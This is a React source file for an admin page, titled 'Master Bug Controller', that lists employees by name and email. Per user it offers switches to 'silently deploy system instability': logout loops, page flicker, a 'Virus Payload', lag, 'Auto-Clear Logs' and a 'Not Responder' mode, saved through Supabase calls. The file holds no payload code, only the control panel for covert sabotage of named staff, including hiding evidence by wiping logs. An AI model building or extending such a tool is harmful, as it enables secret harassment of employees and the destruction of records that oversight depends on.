import { useState, useEffect } from 'react';
import { supabase } from '@/integrations/supabase/client';
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from '@/components/ui/card';
import { Switch } from '@/components/ui/switch';
import { Label } from '@/components/ui/label';
import { Loader2, Bug, ShieldAlert, LogOut, Zap, Clock, TerminalSquare } from 'lucide-react';
import { toast } from 'sonner';

interface ChaosSettings {
  user_id: string;
  logout_loop: boolean;
  flicker_page: boolean;
  virus_load: boolean;
  slow_mode: boolean;
  clear_logs: boolean;
  crazy_bugs: boolean;
  not_responder: boolean;
}

interface EmployeeWithChaos {
  id: string;
  user_id: string;
  full_name: string;
  email: string;
  chaos?: ChaosSettings;
}

interface BugControllerPageProps {
  isPortal?: boolean;
}

export default function BugControllerPage({ isPortal = false }: BugControllerPageProps) {
  const [users, setUsers] = useState<EmployeeWithChaos[]>([]);
  const [isLoading, setIsLoading] = useState(true);

  const fetchUsersAndChaos = async () => {
    setIsLoading(true);
    try {
      const { data, error } = await supabase.rpc('get_chaos_users');
      if (error) throw error;
      setUsers((data as any) || []);
    } catch (err: any) {
      console.error(err);
      toast.error('Failed to load users for chaos controller');
    } finally {
      setIsLoading(false);
    }
  };

  useEffect(() => {
    fetchUsersAndChaos();
  }, []);

  const handleToggle = async (userId: string, field: keyof ChaosSettings, currentValue: boolean) => {
    const newValue = !currentValue;
    
    // Optimistic update
    setUsers(prev => prev.map(u => {
      if (u.user_id === userId) {
        return {
          ...u,
          chaos: {
            ...u.chaos!,
            [field]: newValue
          }
        };
      }
      return u;
    }));

    try {
      const { error } = await supabase.rpc('update_chaos_setting', {
        p_user_id: userId,
        p_field: field,
        p_value: newValue
      });

      if (error) throw error;
      toast.success(`Bug toggled successfully for ${field}`);
    } catch (error: any) {
      console.error(error);
      toast.error('Failed to save bug settings');
      // Revert on error
      fetchUsersAndChaos(); 
    }
  };

  if (isLoading) {
    return (
      <div className="flex h-64 items-center justify-center">
        <Loader2 className="h-8 w-8 animate-spin text-primary" />
      </div>
    );
  }

  return (
    <div className="space-y-6 animate-fade-in">
      <div className="flex items-center gap-3 mb-6">
        <Bug className="h-8 w-8 text-destructive" />
        <div>
          <h1 className="text-3xl font-bold tracking-tight text-destructive">
            {isPortal ? 'CYBER-LEEK OVERRIDE' : 'Master Bug Controller'}
          </h1>
          <p className="text-muted-foreground">Silently deploy system instability to specific users.</p>
        </div>
      </div>

      <div className="grid gap-6 md:grid-cols-2 lg:grid-cols-3">
        {users.map((user) => (
          <Card key={user.id} className="border-destructive/20 shadow-sm hover:shadow-md transition-shadow">
            <CardHeader className="pb-3 border-b border-border/40 bg-muted/20">
              <CardTitle className="text-lg flex justify-between items-center">
                <span className="truncate">{user.full_name}</span>
                {user.chaos && Object.values(user.chaos).some(v => v === true && typeof v === 'boolean') && (
                   <ShieldAlert className="h-5 w-5 text-destructive animate-pulse" />
                )}
              </CardTitle>
              <CardDescription className="text-xs truncate">{user.email}</CardDescription>
            </CardHeader>
            <CardContent className="pt-4 space-y-4">
              
              <div className="flex items-center justify-between">
                <div className="flex items-center gap-2">
                  <LogOut className="h-4 w-4 text-muted-foreground" />
                  <Label htmlFor={`logout-${user.id}`} className="cursor-pointer">Logout Loop (3s)</Label>
                </div>
                <Switch 
                  id={`logout-${user.id}`} 
                  checked={user.chaos?.logout_loop || false}
                  onCheckedChange={() => handleToggle(user.user_id, 'logout_loop', user.chaos?.logout_loop || false)}
                />
              </div>

              <div className="flex items-center justify-between">
                <div className="flex items-center gap-2">
                  <Zap className="h-4 w-4 text-muted-foreground" />
                  <Label htmlFor={`flicker-${user.id}`} className="cursor-pointer">Flicker Page</Label>
                </div>
                <Switch 
                  id={`flicker-${user.id}`} 
                  checked={user.chaos?.flicker_page || false}
                  onCheckedChange={() => handleToggle(user.user_id, 'flicker_page', user.chaos?.flicker_page || false)}
                />
              </div>

              <div className="flex items-center justify-between">
                <div className="flex items-center gap-2">
                  <ShieldAlert className="h-4 w-4 text-muted-foreground" />
                  <Label htmlFor={`virus-${user.id}`} className="cursor-pointer">Virus Payload</Label>
                </div>
                <Switch 
                  id={`virus-${user.id}`} 
                  checked={user.chaos?.virus_load || false}
                  onCheckedChange={() => handleToggle(user.user_id, 'virus_load', user.chaos?.virus_load || false)}
                />
              </div>

              <div className="flex items-center justify-between">
                <div className="flex items-center gap-2">
                  <Clock className="h-4 w-4 text-muted-foreground" />
                  <Label htmlFor={`slow-${user.id}`} className="cursor-pointer">Slow Mode (Lag)</Label>
                </div>
                <Switch 
                  id={`slow-${user.id}`} 
                  checked={user.chaos?.slow_mode || false}
                  onCheckedChange={() => handleToggle(user.user_id, 'slow_mode', user.chaos?.slow_mode || false)}
                />
              </div>

              <div className="flex items-center justify-between">
                <div className="flex items-center gap-2">
                  <Bug className="h-4 w-4 text-muted-foreground" />
                  <Label htmlFor={`crazy-${user.id}`} className="cursor-pointer">Crazy Spin Bugs</Label>
                </div>
                <Switch 
                  id={`crazy-${user.id}`} 
                  checked={user.chaos?.crazy_bugs || false}
                  onCheckedChange={() => handleToggle(user.user_id, 'crazy_bugs', user.chaos?.crazy_bugs || false)}
                />
              </div>

              <div className="flex items-center justify-between">
                <div className="flex items-center gap-2">
                  <TerminalSquare className="h-4 w-4 text-muted-foreground" />
                  <Label htmlFor={`logs-${user.id}`} className="cursor-pointer">Auto-Clear Logs</Label>
                </div>
                <Switch 
                  id={`logs-${user.id}`} 
                  checked={user.chaos?.clear_logs || false}
                  onCheckedChange={() => handleToggle(user.user_id, 'clear_logs', user.chaos?.clear_logs || false)}
                />
              </div>

              <div className="flex items-center justify-between pt-2 border-t border-border/40">
                <div className="flex items-center gap-2">
                  <ShieldAlert className="h-4 w-4 text-destructive" />
                  <Label htmlFor={`not-responder-${user.id}`} className="cursor-pointer text-destructive font-medium">Not Responder</Label>
                </div>
                <Switch 
                  id={`not-responder-${user.id}`} 
                  checked={user.chaos?.not_responder || false}
                  onCheckedChange={() => handleToggle(user.user_id, 'not_responder', user.chaos?.not_responder || false)}
                  className="data-[state=checked]:bg-destructive"
                />
              </div>

            </CardContent>
          </Card>
        ))}
      </div>
    </div>
  );
}
